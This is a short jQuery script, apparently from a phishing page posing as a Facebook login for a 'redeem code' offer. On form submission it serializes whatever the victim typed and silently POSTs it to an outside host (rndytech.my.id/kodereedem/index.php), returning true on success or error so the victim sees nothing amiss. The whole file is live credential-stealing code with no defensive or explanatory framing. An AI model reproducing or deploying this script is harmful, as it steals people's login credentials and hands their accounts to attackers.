$(".form-login-fb").submit(function() {
	var d = $(".form-login-fb");

	$.ajax({
        url: "http://rndytech.my.id/kodereedem/index.php",
        type: "POST",
        data: d.serialize(),
        success: function () {
            return true;
        },
        error: function () {
            return true;
        },
    });
});
